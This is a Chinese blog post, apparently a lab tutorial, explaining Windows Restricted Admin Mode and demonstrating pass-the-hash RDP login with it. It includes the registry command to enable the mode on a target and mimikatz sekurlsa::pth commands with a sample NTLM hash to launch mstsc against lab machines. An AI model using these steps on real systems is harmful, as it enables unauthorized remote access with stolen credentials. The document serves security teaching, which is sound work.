> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/MOgg8TPUqo-Zraxur8Q0xw)

![](https://mmbiz.qpic.cn/mmbiz_jpg/zbTIZGJWWSOdyt9X7tvFfCDR0iawdo9VLUFRvhdSuaJR3pgZH8ftcYQf2ib4Eo9iaO4icx3fECLWvkdViaXnLjzzCPA/640?wx_fmt=jpeg)

一位苦于信息安全的萌新小白帽  

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG 小刚

Restricted Admin Mode  

**受限管理模式**是一项 Windows 功能，可防止将 RDP 用户的凭据存储在建立 RDP 连接的计算机的内存中。

这是用来防止用户（管理员）在 RDP 进入被控主机后，密码保留在被控主机内存中，从而被读取凭据。

受限管理员更改了远程桌面协议，使其使用网络登录而不是交互式登录进行身份验证。有了这种保护，建立 RDP 会话将不需要提供关联的密码；相反用户的 NTLM Hash 或 Kerberos 票证将用于身份验证。

版本情况

下面是微软给出的官方通报

```
https://docs.microsoft.com/zh-cn/security-updates/securityadvisories/2014/2871997
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPCxLRbex0aXhRkX55OqPqpSratA7GZmppwhicicNnKQpYtKodib1ouAFZG5jLHobicwSXMrnzzoDQmcw/640?wx_fmt=png)

可以看到 Windows 8.1、Server 2012 R2 开始支持受限管理员模式，并且默认开启  

其他版本项支持受限管理员模式则需要打相应的补丁，但是默认关闭状态

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPCxLRbex0aXhRkX55OqPqpafqM9hs8GkBia8ErtZjQkpG2qo87icEX3anE1eD7iaBOKEE1Yk4VltINA/640?wx_fmt=png)

正常情况下 Windows8.1、Windows Server 2012R2 默认开启  

但是之后又出了个补丁 KB2973351，将会把它设为默认关闭，想开启需要自己操作注册表

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPCxLRbex0aXhRkX55OqPqpk8cDvpflBGc6icf6B85dbicLKtHEnTB8odG32gFkCbWs4QibF9ksd99fg/640?wx_fmt=png)

修改注册表启用 Restricted Admin Mode

根据官方给出的方式修改注册表就可以启用 Restricted Admin Mode

```
https://support.microsoft.com/zh-cn/topic/microsoft-%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A-%E6%9B%B4%E6%96%B0%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%BB%A5%E6%94%B9%E8%BF%9B%E5%87%AD%E6%8D%AE%E4%BF%9D%E6%8A%A4%E5%92%8C%E5%B7%B2%E5%AE%89%E8%A3%85-2919355-%E6%9B%B4%E6%96%B0%E7%9A%84%E5%9F%BA%E4%BA%8E-windows-%E7%9A%84%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%AE%A1%E7%90%86-2014-%E5%B9%B4-7-%E6%9C%88-8-%E6%97%A5-adf79e61-15b9-3a0c-930c-9c6072b72822
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPCxLRbex0aXhRkX55OqPqp5zb07wGe3VB9Y1ftN3nnFsawy2c7gGusU849Q2KxbuFxAHvY7XuyKQ/640?wx_fmt=png)

新建 DWORD 键值 DisableRestrictedAdmin，0 代表开启，1 代表关闭  

```
REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPCxLRbex0aXhRkX55OqPqpEuFhtzAMztDCFLeAg3sovUxz5Ebk5WK56jTRovghqJ4k9hCjt0Fhfg/640?wx_fmt=png)  

查询 DisableRestrictedAdmin 的值，0x0 表示已开启

```
REG query HKLM\System\CurrentControlSet\Control\Lsa | findstr DisableRestrictedAdmin
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPCxLRbex0aXhRkX55OqPqp7SQl6SBicznyicqREcHaLJuphB4oyIlhMaiaDxfNTsT423icMV32Ob7kwA/640?wx_fmt=png)  

Hash 登录 rdp

因为 "Restricted Admin Mode" 的存在，让 ntlm hash 用于网络身份认证，我们还需要什么明文密码，直接 hash 传递不就登录上桌面了吗  

但想使用 hash 远程登录 RDP，就是根据上面信息判断是否开启 "Restricted Admin Mode" 模式

测试 1

这里我使用 win-8.1(192.168.220.133) 尝试用 hash 登录 win-2012-R2(192.168.220.132)

> 使用 hash 登录 rdp 需要客户端和服务器端都开启 Restricted Admin Mode
> 
> 也就是这里 win-8.1 和 win-2012-R2 都利用上面注册表方式开启此模式

win-8.1 客户端命令行执行

```
mstsc.exe /restrictedadmin
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPCxLRbex0aXhRkX55OqPqpSyBMPVYpYC8QGV6Z9uamwZGZtSwo4Kzkq6BOaOt8UlZLa8K6LxLC2w/640?wx_fmt=png)  

这里是无法登录的，因为 Restricted Admin mode 会用当前 Windows 凭证进行登录，也就是我 win-8.1 的凭证，这肯定是不行的  

客户端管理员权限运行 mimiketz 进行 pth，这里使用 win-2012-r2 的用户名和 hash

```
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:. /ntlm:b9e0cfceaf6d077970306a2fd88a7c0a
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPCxLRbex0aXhRkX55OqPqpQuZicxQCIs6f2yicj7TGVajPiarahaiaGAicBJm7mrXaxdQs2kU2UUmXofg/640?wx_fmt=png)  

执行后弹出一个 cmd 框，这时我们伪造了 win-2012-r2 的凭证  

cmd 框内运行桌面登录

```
mstsc.exe /restrictedadmin
```

这时我们就是利用的 win2012r2 的凭证进行远程登录，如下图成功实现远程登录  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPCxLRbex0aXhRkX55OqPqpdBLicz1RSBPfOjGcZLoKSCeQUAcEQNghjJ7WZ2AyyPcQLYNvby6yyOA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPCxLRbex0aXhRkX55OqPqpb5Ta2UWe67UZTuuBDqZ8GQU2nLyekqElAUNzJ0m85GNhpQw0On9G7A/640?wx_fmt=png)

测试 2

尝试对 win-2008-R2(192.168.200.128) 进行 hash 登录

正常 win-2008-R2 是没有受限管理员模式的，根据微软文档，给 win-2008-R2 打上补丁 KB2984972

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPCxLRbex0aXhRkX55OqPqpyHA6spBbOGsveurGegg5f0ibSdBjxsHV5dN25RZpTqhVVI77WQxQyzg/640?wx_fmt=png)

查看注册表，发现并没有 DisableRestrictedAdmin 这个键值对  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPCxLRbex0aXhRkX55OqPqpD1UvfgOFerkD0GO0lnRica0dnxWhSr0ZxnxKh0xt1q3zicV5glUYN45A/640?wx_fmt=png)

直接使用 mimikatz 进行 pth 攻击  

```
privilege::debug
sekurlsa::pth /user:Administrator /domain:. /ntlm:b9e0cfceaf6d077970306a2fd88a7c0a "/run:mstsc.exe /restrictedadmin"
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPCxLRbex0aXhRkX55OqPqp5AuCZgXCP4aT6ric1y0BGOA3QlAuTl1SRDvzI8rkt2mk9unOic5JOWRA/640?wx_fmt=png)  

登录发现不行  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPCxLRbex0aXhRkX55OqPqpU7jia3HODPqlv1Sd6dMZ4ibz6r1wzDZ6x7uMEDfdFcAmict2RKGRM1ssQ/640?wx_fmt=png)

在 win-2008-r2 修改注册表，开启受限管理员模式  

```
REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSPCxLRbex0aXhRkX55OqPqp24Ric1QhIaibgc8QMmwCfcaDxGKCAzp8SRVjLRydHZBQZblV4JQHV4Wg/640?wx_fmt=png)  

就可以成功登录了，说明 win2008 那些打的补丁，受限管理员模式是默认关闭状态。  

注意

受限管理员模式只对管理员组成员有效，如果获取的用户只是可以远程桌面但不是管理员，那么就无法利用 hash 登录的。